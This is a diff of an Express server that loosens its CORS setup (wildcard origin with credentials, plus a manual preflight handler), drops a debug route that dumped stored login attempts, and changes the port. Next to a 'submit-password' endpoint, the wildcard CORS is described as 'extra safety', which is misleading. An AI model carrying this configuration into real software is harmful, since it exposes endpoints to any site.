@@ -6,14 +6,25 @@ const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 
-// === Simple & Reliable CORS (this usually fixes preflight on Railway) ===
-app.use(cors({
-  origin: '*',                    // Allow Vercel + localhost for now
+// === Most Reliable CORS Setup for Railway + Vercel ===
+const corsOptions = {
+  origin: '*',                    // Allow all (including your Vercel site)
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization'],
   credentials: true,
   maxAge: 86400
-}));
+};
+
+app.use(cors(corsOptions));
+
+// Extra safety: manually handle preflight for all routes
+app.options('*', (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+  res.setHeader('Access-Control-Max-Age', '86400');
+  res.status(204).end();
+});
 
 app.use(express.json());
 
@@ -97,14 +108,9 @@ app.post("/api/submit-password", async (req, res) => {
   res.json({ status: "success", message: "Done" });
 });
 
-// Debug (optional)
-app.get("/api/debug", (req, res) => {
-  res.json(Array.from(loginAttempts.entries()));
-});
-
-const port = process.env.PORT || 3000;
+const port = process.env.PORT || 8080;
 
 app.listen(port, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${port}`);
-  console.log("✅ CORS enabled (origin: *)");
+  console.log("✅ CORS enabled with origin: *");
 });
